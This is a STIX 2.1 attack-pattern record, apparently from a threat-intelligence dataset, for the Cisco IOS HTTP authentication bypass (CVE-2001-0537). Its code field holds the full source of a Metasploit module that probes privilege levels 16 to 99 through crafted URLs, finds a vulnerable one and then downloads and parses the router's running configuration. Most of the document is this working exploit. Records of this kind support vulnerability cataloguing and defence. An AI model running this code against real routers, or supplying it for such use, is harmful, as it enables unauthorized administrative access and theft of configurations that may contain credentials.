{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce1dd466-f28a-4c71-9bf4-083847764944",
    "created": "2024-08-14T16:30:21.13786Z",
    "modified": "2024-08-14T16:30:21.137871Z",
    "name": "Cisco IOS HTTP Unauthorized Administrative Access",
    "description": " This module exploits a vulnerability in the Cisco IOS HTTP Server. By sending a GET request for \"/level/num/exec/..\", where num is between 16 and 99, it is possible to bypass authentication and obtain full system control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module tested successfully against a Cisco 1600 Router IOS v11.3(11d). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_ios_auth_bypass.rb",
            "external_id": "cisco_ios_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0537"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n\n  # Include Cisco utility methods\n  include Msf::Auxiliary::Cisco\n\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Cisco IOS HTTP Unauthorized Administrative Access',\n      'Description'    => %q{\n        This module exploits a vulnerability in the Cisco IOS HTTP Server.\n        By sending a GET request for \"/level/num/exec/..\", where num is between\n        16 and 99, it is possible to bypass authentication and obtain full system\n        control. IOS 11.3 -> 12.2 are reportedly vulnerable. This module\n        tested successfully against a Cisco 1600 Router IOS v11.3(11d).\n      },\n      'Author'\t\t=> [ 'aushack', 'hdm' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          [ 'BID', '2936'],\n          [ 'CVE', '2001-0537'],\n          [ 'OSVDB', '578' ],\n        ],\n      'DisclosureDate' => '2001-06-27'))\n  end\n\n  def run_host(ip)\n\n    16.upto(99) do |level|\n      res = send_request_cgi({\n        'uri'  \t\t=>  \"/level/#{level}/exec/show/version/CR\",\n        'method'   \t=> 'GET'\n      }, 20)\n\n      if res and res.body and res.body =~ /Cisco Internetwork Operating System Software/\n        print_good(\"#{rhost}:#{rport} Found vulnerable privilege level: #{level}\")\n\n        report_vuln(\n          {\n            :host\t=> rhost,\n            :port\t=> rport,\n            :proto  => 'tcp',\n            :name\t=> self.name,\n            :sname  => ssl ? \"https\" : \"http\",\n            :info\t=> \"Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR\",\n            :refs   => self.references,\n            :exploited_at => Time.now.utc\n          }\n        )\n\n        res = send_request_cgi({\n          'uri'  \t\t=>  \"/level/#{level}/exec/show/config/CR\",\n          'method'   \t=> 'GET'\n        }, 20)\n\n        if res and res.body and res.body =~ /<FORM METHOD([^\\>]+)\\>(.*)<\\/FORM>/mi\n          config = $2.strip\n          print_good(\"#{rhost}:#{rport} Processing the configuration file...\")\n          cisco_ios_config_eater(rhost, rport, config)\n          report_exploit(\n            {\n              :host\t\t=> rhost,\n              :port\t\t=> rport,\n              :name\t\t=> self.name,\n              :sname      => ssl ? \"https\" : \"http\",\n              :info       => \"Module #{self.fullname} successfully captured the configuration file:\\n#{config}\"\n            }\n          )\n        else\n          print_error(\"#{rhost}:#{rport} Error: could not retrieve the IOS configuration\")\n        end\n\n        break\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-06-27"
}